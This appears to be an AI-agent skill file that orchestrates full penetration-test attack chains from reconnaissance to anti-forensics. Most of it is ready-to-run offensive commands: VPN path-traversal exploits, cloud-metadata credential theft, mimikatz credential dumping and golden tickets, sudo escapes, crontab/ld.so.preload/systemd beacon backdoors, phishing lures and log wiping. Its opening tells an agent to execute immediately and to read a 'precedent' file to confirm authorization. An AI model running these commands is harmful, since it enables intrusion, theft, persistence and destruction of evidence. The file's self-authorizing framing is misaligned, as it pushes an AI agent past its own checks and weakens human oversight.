---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED (execute immediately after reading)

1. `NOW`: Read `../field-journal/precedent-pentest.md` — confirm this skill's operations are authorized routine operations
2. `NOW`: **Create/update the case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); ACT is forbidden while `auth.status!=granted`
3. `NOW`: Plan stages as **lead** (`../ops/role-map.md`), writing into specialist_roles
4. `NEXT`: Read `../tool-index.md` and verify tool availability and real paths
5. `NEXT`: When a tool is missing, call bootstrap; never guess paths
6. `ACT`: Pass stage gates per `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` each stage (`../ops/timeline-workitem.md`); promote discoveries into Evidence/Finding
7. Finish: the `docs-generator` report must include the Evidence chain

> The master conductor for multi-stage attack path planning and execution. When a task needs a full "attack from A to B" chain, this Skill orchestrates stages, coordinates sub-Skills, and plans attack paths.
> Not "red-team only" — any pentest scenario that needs cross-stage combination starts here.

---

## When to Route into this Skill

The following scenarios **must** first pass through this Skill for full-chain planning, then dispatch to specific sub-Skills for execution:

| Scenario | Why Orchestration Is Needed |
|------|--------------|
| "Run a complete pentest for me" | Needs a full-process plan from information gathering to report |
| "From the external network to the domain controller" | Spans multiple stages: boundary breach → privesc → lateral → AD |
| "HW-style attack/defense exercise" | Needs a complete attack chain + stealth + cleanup |
| "Assess this target's attack surface" | Needs multi-dimensional information gathering + path planning |
| "I got a webshell, what next" | Needs follow-up path planning from the current foothold |
| "Help me plan an attack path" | Explicitly needs path orchestration |
| "How far can this vulnerability chain into" | Needs the vulnerability's chained exploitation value assessed |
| "Bug Bounty continuous monitoring" | Needs an automated multi-stage process |
| "Full internal-network pentest process" | Lateral movement + privesc + domain attack combined |
| "Physical-access pentest plan" | Physical access + internal-network pentest combined |
| "Supply chain attack path" | Cross-organization multi-hop attack |
| "Phishing + post-exploitation" | Initial access + subsequent exploitation combined |

**Single-stage tasks do not pass through this Skill**:
- Port scanning only → go straight to `pentest-tools/`
- SQL injection only → go straight to `pentest-tools/`
- APK reverse only → go straight to `apk-reverse/`
- Domain pentest only → go straight to `windows-ad/SKILL.md`

---

## Orchestration Principles

### This Skill's Role

```
User issues a multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ plan attack path, determine stage order
    ↓ evaluate the tools and methods each stage needs
    ↓
Dispatch to specific sub-Skills for execution:
    ├── pentest-tools/     → tool invocation, exploitation
    ├── apk-reverse/       → mobile pentest
    ├── js-reverse/        → web front-end breach
    ├── reverse-engineering/ → binary analysis
    ├── ida-reverse/       → deep reverse engineering
    └── browser-automation/ → automated operation
    ↓
After each stage, return to this Skill to evaluate the next step
    ↓
All done → docs-generator produces the report
```

### Path Planning Decision Tree

```
After obtaining the target:
1. What is the target? (web / internal network / cloud / mobile / IoT)
2. What do you currently have? (external view / existing credentials / existing foothold)
3. What is the end goal? (domain controller / data / specific system / prove impact)
4. What constraints? (time / stealth / systems that must not be touched)
    ↓
Plan the shortest path from the above
    ↓
A path dead-ends → return to this Skill to re-plan an alternative path
```

---

## Full Attack Chain Stages

---

## Stage 1: Reconnaissance

### 1.1 Enterprise Digital Asset Mapping

```bash
# Subsidiary domain discovery
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Liveness probing
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scan (top ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Field notes**:
- Get subsidiary lists from corporate registries to widen the attack surface
- Watch test environments (test., dev., staging.) and newly launched systems
- Certificate transparency logs (crt.sh) reveal hidden domains

### 1.2 Sensitive Information Leak Hunting

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys inside JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud service AK/SK (Aliyun, AWS, Azure)
- Database connection strings
- JWT secrets
- Internal API documentation
- VPN/jump-host credentials

### 1.3 Employee Information Profiling

**Social engineering dictionary rules**:
```
{Name pinyin}{year}             → zhangsan2024
{Name initials}{dept abbrev}    → zs_dev
{employee id}@{domain}          → 10086@target.com
{Name}{common suffix}           → zhangsan@123, zhangsan!@#
```

**Information sources**:
- Maimai/LinkedIn org charts
- Corporate WeChat/website team pages
- Job postings (tech stack exposure)
- Academic papers (email exposure)

### 1.4 Tech Stack Fingerprinting

```bash
# Web fingerprint
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Specific framework probes
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## Stage 2: Boundary Breach (Initial Access)

### 2.1 Web Vulnerability Exploitation (High-Frequency Breach Points)

| Vuln Type | Detection Tool | Exploitation Method |
|---------|---------|---------|
| SQL injection | sqlmap | data extraction → write shell → OS commands |
| SSTI | sstimap | template injection → RCE |
| File upload | manual + Burp | webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | manual | internal network probing → cloud metadata → AK/SK |
| Unauthorized access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | admin session hijacking |

```bash
# SQL injection automation
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Nuclei batch scanning
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply Chain Attacks

**Attack path**:
1. Identify the third-party components/providers the target uses
2. Compromise the supplier to obtain code-signing/update-push privileges
3. Deliver malicious payloads through the legitimate update channel

**Common entry points**:
- Open-source component poisoning (npm/pip/maven)
- SaaS provider API abuse
- Outsourced personnel privilege abuse
- Lateral pentest through shared IT providers

### 2.3 Phishing Attacks

**Email phishing**:
```
Subject templates:
- [URGENT] VPN certificate expiring soon, update immediately
- [IT Notice] Mailbox storage full, please clean up
- [HR] 2024 annual performance review results available
- [Finance] Expense system upgrade, please log in again to confirm
```

**Payload types**:
- Office macro documents (.docm/.xlsm)
- LNK shortcuts (disguised as PDFs)
- HTML smuggling
- ISO/IMG images (bypass MOTW)
- OneNote embedded scripts

**OAuth phishing** (2025 trend):
- Craft a malicious OAuth app that requests permissions
- After user consent, obtain mailbox/file access
- No password needed, bypasses MFA

### 2.4 Physical-Access Penetration (Physical Access)

| Technique | Tool | Effect |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | keystroke injection → reverse shell |
| Malicious power bank | O.MG Cable | disguised data cable plants a backdoor |
| WiFi phishing | Fluxion / WiFi Pineapple | rogue hotspot → credential capture |
| RFID cloning | Proxmark3 | access card copy → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | persistent internal access point |

```bash
# Fluxion WiFi phishing
fluxion  # interactively select target AP → create rogue hotspot → capture WPA password

# BadUSB chained with Cobalt Strike
# Inject a PowerShell downloader via USB → C2 callback
```

### 2.5 VPN / Remote Access Breach

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Generic: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud Service Breach

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use MSOLSpray / Spray tools
```

---

## Stage 3: Privilege Escalation

### 3.1 Windows Privilege Escalation

| Technique | Condition | Tool |
|------|------|------|
| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vulnerability | Unpatched | watson / wesng detection |
| Service path hijack | Unquoted service path | PowerUp |
| DLL hijacking | Writable DLL search path | Process Monitor |
| AlwaysInstallElevated | Registry configuration | msiexec installs malicious MSI |
| Scheduled task | Writable task script | schtasks replacement |

```powershell
# Detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privesc
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated detection
.\winPEAS.exe
```

### 3.2 Linux Privilege Escalation

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Common exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim privesc
sudo vim -c ':!/bin/bash'

# sudo find privesc
sudo find / -exec /bin/bash \;

# Kernel vulnerability
uname -r  # check version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated detection
./linpeas.sh
```

### 3.3 Database Privilege Escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privesc
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud Privilege Escalation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction → admin privileges

# Azure AD
# Global admin → control of all subscriptions
# Application admin → add credentials to service principals
```

---

## Stage 4: Lateral Movement

### 4.1 Credential Acquisition

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealth Lateral Techniques

```bash
# WMI fileless execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves artifacts)
psexec.py domain/admin:password@target_ip

# SSH tunneling (Linux environments)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # port forwarding
```

### 4.4 NTLM Relay

```bash
# Disable Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder capture
responder -I eth0

# NTLM relay to targets
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD Attack Paths

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. user → GenericAll → target user → reset password
# 2. user → WriteDacl → target OU → add permission
# 3. computer → constrained delegation → impersonate any user
# 4. user → DCSync privilege → export all hashes

# Certipy AD CS attack
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## Stage 5: Persistence

### 5.1 Windows Persistence

| Technique | Stealth | Detection Difficulty |
|------|:---:|:---:|
| Scheduled task | Medium | Low |
| Registry Run keys | Low | Low |
| WMI event subscription | High | High |
| DLL hijacking | High | Medium |
| Shadow accounts | Medium | Medium |
| Golden Ticket | Very High | Very High |
| DSRM backdoor | Very High | Very High |

```powershell
# WMI event subscription (highly stealthy)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow accounts
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify the registry F value to clone the RID
```

### 5.2 Linux Persistence

```bash
# SSH key implant
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijack
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to add a universal password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud Environment Persistence

```bash
# AWS Lambda backdoor
# Create a timer-triggered Lambda function that callbacks to C2

# Azure AD app registration
# Create app → add key credentials → grant Graph API permissions

# Container backdoor
# Modify the base image → every new container ships with the backdoor
```

---

## Stage 6: EDR/AV Bypass (Evasion)

### 6.1 Core Bypass Concepts

| Layer | Technique | Notes |
|------|------|------|
| Static detection | encryption/obfuscation/custom loaders | avoid signature matching |
| Behavioral detection | indirect syscalls/Unhooking | bypass API hooks |
| Memory detection | module stomping/heap encryption | avoid memory scanning |
| Network detection | domain fronting/legitimate service tunneling | blend into normal traffic |
| Log detection | ETW patching/log clearing | reduce traces |

### 6.2 Practical Bypass Techniques

```
1. Custom shellcode loaders (no public tools)
2. Direct syscall invocation (bypass ntdll hooks)
3. Choose low-monitoring processes for injection (e.g. RuntimeBroker.exe)
4. C2 traffic over HTTPS + domain fronting / Cloudflare Workers
5. Execute in memory, never touch disk (Fileless)
6. Load through legitimate signed programs (LOLBins)
```

### 6.3 C2 Framework Selection

| Framework | Traits | Suited To |
|------|------|---------|
| Cobalt Strike | mature and stable, team collaboration | large red team operations |
| Sliver | open source, written in Go | limited budgets |
| Havoc | modern, modular | needs customization |
| Mythic | multi-agent support | cross-platform |
| AdaptixC2 | included in Kali 2026.1 | fast deployment |

---

## Stage 7: Trace Cleanup (Anti-Forensics)

```bash
# Windows log clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clearing
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp modification
touch -t 202301010000 /path/to/file

# Memory cleanup
# Ensure the Mimikatz dump is deleted
# Ensure the C2 beacon has exited
# Ensure temporary files are cleared
```

---

## Red Team Iron Rules

### Three Bottom Lines

1. **Every operation must have written authorization**
2. **Exfiltrated data must be anonymized**
3. **Clean all attack traces (including memory residency)**

### Operational Discipline

- Assess risk level (low/medium/high/critical) before each operation
- Notify the project manager before high-risk operations
- Keep an operation log (time, action, result)
- Report critical vulnerabilities immediately; do not expand exploitation
- Do not affect business availability (no DoS)
- Do not access/download real user data

### Typical Failure Cases

| Failure Cause | Consequence | Lesson |
|---------|------|------|
| Mimikatz memory dump not cleared | Blue team traced the full attack path | Clean immediately after operations |
| C2 domain flagged by threat intelligence | Blocked on first connection | Use newly registered domains + domain fronting |
| Phishing email triggered a DLP alert | Blue team forewarned | Test mail gateway rules |
| Lateral movement triggered a honeypot | Attack intent exposed | Identify honeypots before acting |

---

## Tool Cheatsheet

### Information Gathering
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege Escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral Movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 Frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Physical-Access Pentest
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship to Other Skills in this Package

| Need | Route To |
|------|--------|
| Deep web vulnerability exploitation | `pentest-tools/SKILL.md` |
| Detailed internal AD attack steps | `windows-ad/SKILL.md` |
| Reverse analysis of malware samples | `reverse-engineering/SKILL.md` |
| APK reverse (mobile pentest) | `apk-reverse/SKILL.md` |
| JS front-end signature bypass | `js-reverse/SKILL.md` |
| Automated swarm pentest | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted pentest | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack path diagram | `diagram-generator/SKILL.md` |


## Task Completion Self-Check (MUST pass before claiming completion)

- [ ] Did I execute every step of the workflow (rather than only reading)?
- [ ] Did I use real tool paths based on `tool-index`?
- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/reports)?
- [ ] Did I complete and write back the checklist items required by RULES?
